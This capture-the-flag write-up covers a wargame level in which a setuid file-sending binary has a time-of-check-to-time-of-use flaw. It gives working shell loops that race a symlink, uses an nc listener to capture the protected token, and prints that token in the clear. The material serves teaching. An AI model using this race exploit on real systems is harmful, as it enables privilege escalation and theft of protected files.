# Level 10


<br>

### >> [Flag file](../flag) <<

<br>


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
> d--x--x--x  1 root    users     340 Aug 30  2015 ..
> -r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
> -r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
> -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
> -r-x------  1 level10 level10   675 Apr  3  2012 .profile
> -rw-------  1 flag10  flag10     26 Mar  5  2016 token
> ```

> ```bash
> ./level10
> ```
> > ```
> > ./level10 file host
> > 	sends file to host if you have access to it
> > ```

> ```bash
> ./level10 token localhost
> ```
> > ```
> > You don't have access to token
> > ```

> ```bash
> echo abc > /tmp/token
> ./level10 /tmp/token 127.0.0.1
> ```
> > ```
> > Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
> > ```
> We're gonna need to use `nc` to listen on port 6969 and catch the token.

> On a terminal, let's listen on port 6969 with `nc`:
> ```bash
> nc -4 -l 6969 > /tmp/out
> ```
> On another terminal:
> ```bash
> echo abc > /tmp/token
> ./level10 /tmp/token 127.0.0.1
> ```
> > ```
> > Connecting to 127.0.0.1:6969 .. Connected!
> > Sending file .. wrote file!
> > ```
> `nc` is now ended and in `/tmp/out`:
> ```bash
> cat /tmp/out
> ```
> > ```
> > abc
> > ```


#### Step 2:

- It seems to be a simple TCP client that sends a file to a server if the user has access to it.

- Let's see how it does that:
```bash
nc -4 -l 6969 > /tmp/out &  # Launched in background
echo abc > /tmp/token
ltrace ./level10 /tmp/token 127.0.0.1
```

> ```
> __libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
> access("/tmp/token", 4)                                                      = 0
> printf("Connecting to %s:6969 .. ", "127.0.0.1")                             = 32
> fflush(0xb7fd1a20)                                                           = 0
> socket(2, 1, 0)                                                              = 3
> inet_addr("127.0.0.1")                                                       = 0x0100007f
> htons(6969, 1, 0, 0, 0)                                                      = 14619
> connect(3, 0xbffff6ec, 16, 0, 0)                                             = 0
> write(3, ".*( )*.\n", 8)                                                     = 8
> printf("Connected!\nSending file .. ")                                       = 27
> fflush(0xb7fd1a20)                                                           = 0
> open("/tmp/token", 0, 010)                                                   = 4
> read(4, "abc\n", 4096)                                                       = 4
> write(3, "abc\n", 4)                                                         = 4
> puts("wrote file!")                                                          = 12
> +++ exited (status 12) +++
>
> Connecting to 127.0.0.1:6969 .. Connected!
> Sending file .. wrote file!
> ```
> We can see that it first checks if the user has access to the file with `access()`, then it `connect()`s to the given host on port 6969 ***and after that** it `open()`s the file.

> [!CAUTION]
> **An `access()` and a `open()` are not atomic!**<br>
> This means that the file can be modified or removed between the time `access()` is called and the time `open()` is called.<br>
> It's called a [**TOCTOU** (Time Of Check To Time Of Use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) vulnerability.


#### Step 3:

- We need symlink pointing to one of the files that the user `flag10` has access to, and then we need to replace it with the `token` file after the `access()` call and before the `open()` call.

- So let's create a loop that will constantly change the target of our symlink:
```bash
touch /tmp/ownedFile
while true; do
	ln -sf flag10 /tmp/symlink
	ln -sf /tmp/ownedFile /tmp/symlink
done
```

- We need a repeating `nc` command to catch the token, so let's create a loop too:
```bash
while true; do
	nc -4 -l 6969 >> /tmp/out 2> /dev/null
done
```

- Finally, we need an ultimate loop that will call the `level10` program with our symlink:
```bash
while true; do
	./level10 /tmp/symlink >/dev/null 2>&1
done
```

- Everything together, we have this:
```bash
touch /tmp/ownedFile
while [ -f /tmp/ownedFile ]; do nc -4 -l 6969 >> /tmp/out 2> /dev/null; done &
while [ -f /tmp/ownedFile ]; do ln -sf /home/user/level10/token /tmp/symlink; ln -sf /tmp/ownedFile /tmp/symlink; done &
while [ -f /tmp/ownedFile ]; do ./level10 /tmp/symlink 127.0.0.1 > /dev/null 2>&1; done &
```

- After a few seconds, we can stop the loops and check the content of `/tmp/out`:
```bash
rm -f /tmp/ownedFile
killall nc
killall ln
killall level10
sort -u /tmp/out
```

> ```
> .*( )*.
> woupa2yuojeeaaed06riuj63c
> ```


#### Step 4:

- Don't forget to get the flag to validate the level:
```bash
su flag10 -c getflag
```


<br>

---

[<<](/level09/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>
